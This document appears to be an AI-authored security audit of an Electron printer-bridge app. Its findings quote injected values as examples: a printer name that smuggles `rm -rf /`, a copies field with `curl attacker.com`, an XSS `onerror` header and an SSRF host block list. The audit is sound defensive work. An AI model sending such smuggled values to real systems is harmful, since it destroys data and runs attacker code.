# Tacoza Tray — Security Audit Report

**Date:** 2026-06-06  
**Scope:** Full source review + automated penetration and load testing  
**Auditor:** Internal (Claude Code)

---

## Executive Summary

Tacoza Tray is a locally-installed Electron tray service that bridges web apps to hardware peripherals (printers, serial, HID, USB) via a localhost WebSocket with token authentication. The core authentication design is sound — 256-bit random token, constant-time comparison, 10-second handshake timeout. However, several critical and high-severity issues were identified and fixed during this audit.

---

## Findings

### CRITICAL

#### C-1 — Command Injection via Printer Name (`printer.js`, `escpos.js`)

| Field | Value |
|---|---|
| **File** | `src/adapters/printer.js`, `src/adapters/escpos.js` |
| **Status** | **Fixed** |

**Description:** The `printerName` parameter (received from the WebSocket client after auth) was interpolated directly into shell commands using `exec()`:

```js
// BEFORE (vulnerable)
execAsync(`lp -d "${printerName}" -o raw ${copiesFlag} "${tmpFile}"`)
execAsync(`copy /b "${tmpFile}" "\\\\.\\${printerName}"`)
```

An authenticated client sending `printer: 'HP"; rm -rf /; echo "'` would execute arbitrary shell commands with the application's OS privileges.

**Fix:** Added `validatePrinterName()` rejecting any name outside `[A-Za-z0-9 _\-\.\(\)@\\]`. Replaced `exec()` with `execFile()` (argument array, no shell) on all POSIX paths. Windows `copy /b` path also guarded by the validator.

---

#### C-2 — Command Injection via `copies` Parameter (`printer.js`)

| Field | Value |
|---|---|
| **File** | `src/adapters/printer.js` |
| **Status** | **Fixed** |

**Description:** The `copies` parameter was interpolated as-is into shell commands:

```js
// BEFORE (vulnerable)
const copiesFlag = copies > 1 ? `-n ${copies}` : ''
execAsync(`lp -d "${printerName}" -o raw ${copiesFlag} "${tmpFile}"`)
```

Sending `copies: "1 && curl attacker.com"` would inject into the command string.

**Fix:** Added `validateCopies()` that parses `parseInt` and enforces `1–99` integer range.

---

#### C-3 — CSS / Number Injection via `paperWidthMm` (`printer.js`)

| Field | Value |
|---|---|
| **File** | `src/adapters/printer.js` |
| **Status** | **Fixed** |

**Description:** `paperWidthMm` was interpolated into CSS inside a hidden BrowserWindow with no validation.

**Fix:** Validate as `parseFloat`, reject values outside `20–500`.

---

### HIGH

#### H-1 — No WebSocket Message Size Limit (Memory Exhaustion / DoS)

| Field | Value |
|---|---|
| **File** | `src/server/index.js` |
| **Status** | **Fixed** |

**Description:** The WebSocket server had no `maxPayload` setting. An authenticated or unauthenticated client could send arbitrarily large messages (e.g., 500 MB), causing the Node.js process to OOM-crash.

**Fix:** Added `maxPayload: 1 * 1024 * 1024` (1 MB) to `WebSocketServer` options. Messages exceeding this are rejected at the transport layer before any application code runs.

---

#### H-2 — No Connection Rate Limiting (Auth-Phase DoS)

| Field | Value |
|---|---|
| **File** | `src/server/index.js` |
| **Status** | **Fixed** |

**Description:** No limit on how many connections a single IP could open per second. An attacker on the same machine could flood the server with connection attempts, exhausting file descriptors or degrading auth-handshake timing.

**Fix:** Added a per-IP sliding-window rate limiter: max 10 connections per 60-second window. Excess connections receive close code `1008` and no hello frame.

---

#### H-3 — SSRF via Network Printer Host (`escpos.js`)

| Field | Value |
|---|---|
| **File** | `src/adapters/escpos.js` |
| **Status** | **Fixed** |

**Description:** `printNetwork()` and `status()` make outbound TCP connections to whatever `host:port` is stored in the printer config. The `addPrinter` IPC handler accepted any host value, including `127.0.0.1`, `localhost`, `169.254.x.x` (link-local/cloud-metadata), and IPv6 loopback. An authenticated client that can manipulate printer config could use this for internal port scanning.

**Fix:** Added `validateNetworkHost()` that blocks loopback (`127.`, `localhost`, `::1`), unspecified (`0.0.0.0`), link-local (`169.254.`), and ULA IPv6 prefixes. Called on `addPrinter`, `print`, `testPrint`, and `status`.

---

#### H-4 — Stored XSS in Settings UI via `c.origin` (WebSocket Header)

| Field | Value |
|---|---|
| **File** | `src/settings/ui/app.js` |
| **Status** | **Fixed** |

**Description:** The `origin` field shown in the Connected Clients panel was the raw HTTP `Origin` header from the WebSocket handshake — set by the client, not sanitized, and injected via `innerHTML`. A client connecting with a crafted `Origin: <img src=x onerror=...>` header could execute script in the Settings renderer.

**Fix:** Wrapped `c.origin` in the existing `esc()` HTML-escape helper before inserting into `innerHTML`.

---

### MEDIUM

#### M-1 — `script-src 'unsafe-inline'` in Content Security Policy

| Field | Value |
|---|---|
| **File** | `src/settings/ui/index.html` |
| **Status** | **Fixed** |

**Description:** The Settings window CSP allowed `'unsafe-inline'` for scripts, negating XSS protection. All logic was in `app.js` so inline was never needed — it was left over from early development.

**Fix:** Removed `'unsafe-inline'` from `script-src`. Added `connect-src 'none'`, `object-src 'none'`, `base-uri 'none'`. Moved all 10 inline `onclick`/`onchange` HTML attributes to `addEventListener` bindings in `app.js`.

---

#### M-2 — No Input Validation on `addPrinter` IPC Handler

| Field | Value |
|---|---|
| **File** | `src/adapters/escpos.js`, `src/settings/index.js` |
| **Status** | **Fixed** |

**Description:** The `printers:add` IPC handler passed the raw config object from the renderer directly to `escpos.addPrinter()` with no validation. Invalid types, excessively long strings, or malformed ports could be stored and later reach print backends.

**Fix:** `addPrinter()` now validates `type` (allowlist), `host` (SSRF guard), `port` (integer 1–65535), and `name` (printer name validator).

---

#### M-3 — Internal Error Messages Returned to WebSocket Clients

| Field | Value |
|---|---|
| **File** | `src/server/router.js` |
| **Status** | Accepted risk (informational) |

**Description:** `err.message` from adapter exceptions is returned verbatim to authenticated clients. This can leak file paths (e.g., `ENOENT /tmp/tz-print-...`), internal hostnames, and OS details.

**Recommendation:** Consider scrubbing error messages in production builds (replace with a generic error code + log internally). Left as-is for now because the audience is authenticated local tooling that benefits from descriptive errors during development.

---

### LOW / INFORMATIONAL

| ID | Finding | Status |
|----|---------|--------|
| L-1 | Version disclosed in `hello` frame before auth | Accepted — not exploitable |
| L-2 | Temp files named with `Date.now()` (predictable but requires local access) | Accepted |
| L-3 | Single shared token — no per-client revocation | By design |
| L-4 | No audit log of authenticated operations | Future work |
| L-5 | `ws` library vulnerable to any known CVEs? | Run `npm audit` before each release |

---

## What Was NOT Found

- **Authentication bypass** — `enforceAuth` correctly uses `ws.once`, timing-safe compare, and closes on any non-auth first message.
- **IPC privilege escalation** — `contextIsolation: true` + `nodeIntegration: false` on the renderer; the preload bridge exposes only the declared nine handlers.
- **Path traversal** — all file writes go to `os.tmpdir()` with UUIDs or hashes; no user-controlled path segments.
- **Token exfiltration from storage** — `electron-store` uses the OS credential store; no network calls are made.

---

## Test Suites

### Penetration Tests

```bash
# With Tacoza Tray running on default port:
npm run test:security                        # unauthenticated tests only
npm run test:security -- 7777 <your-token>  # full suite including injection probes
```

Covers: connectivity, all auth bypass patterns, injection probes (printer name, copies), rate-limit verification, oversized payload, token confidentiality.

### Load Tests

```bash
npm run test:load                        # unauthenticated scenarios only
npm run test:load -- 7777 <your-token>  # full suite
```

Scenarios: 50-connection storm, auth throughput (p95 threshold 2 s), 200 req/s message flood, 5 concurrent clients, 2 MB oversized message, malformed JSON flood.

---

## Remediation Summary

| Severity | Count | Fixed | Accepted |
|----------|-------|-------|----------|
| Critical | 3 | 3 | 0 |
| High | 4 | 4 | 0 |
| Medium | 3 | 2 | 1 |
| Low / Info | 5 | 0 | 5 |
| **Total** | **15** | **9** | **6** |

---

## Recommendations Before Production Release

1. **Run `npm audit`** — native modules (serialport, usb, node-hid) pull in binary deps; audit before each build.
2. **Enable Electron sandbox** — add `sandbox: true` to any BrowserWindow that loads remote or user-generated content.
3. **Code-sign the build** — the macOS build already has `hardenedRuntime: true`; ensure a valid Developer ID cert is used.
4. **Consider rate-limiting per operation** — e.g., max 10 print jobs per minute per client.
5. **Set up Dependabot / Renovate** — the ws, electron, and serialport packages receive frequent security updates.
